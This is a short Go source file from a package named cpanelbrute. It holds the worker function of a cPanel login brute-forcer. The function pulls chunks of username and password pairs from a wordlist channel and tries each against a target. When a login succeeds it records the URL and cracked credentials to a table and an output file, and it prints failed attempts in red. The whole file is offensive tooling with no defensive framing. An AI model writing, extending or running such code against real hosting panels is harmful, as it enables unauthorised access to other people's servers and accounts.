package cpanelbrute

import (
	"fmt"
	"os"
	"sync"

	"github.com/fatih/color"
	"github.com/olekukonko/tablewriter"
)

func HandleBrute(target string, wordlistChunks <-chan []string, wg *sync.WaitGroup, mutex *sync.Mutex, table *tablewriter.Table, file *os.File) {
	defer wg.Done()

	credChunks := <-wordlistChunks
	for _, creds := range credChunks {
		validCreds, err := MakeRequest(target, creds)
		if err == nil {
			username, password, url := validCreds[0], validCreds[1], validCreds[2]
			mutex.Lock()
			table.Append([]string{url, username, password})
			table.Render()
			result := fmt.Sprintf("%s => %s", target, creds)
			file.WriteString(result)
			mutex.Unlock()
			os.Exit(0)
		} else {
			mutex.Lock()
			errMsg := fmt.Sprintf("%s => %v", creds, err)
			color.New(color.FgRed).Println(errMsg)
			mutex.Unlock()
		}
	}

}
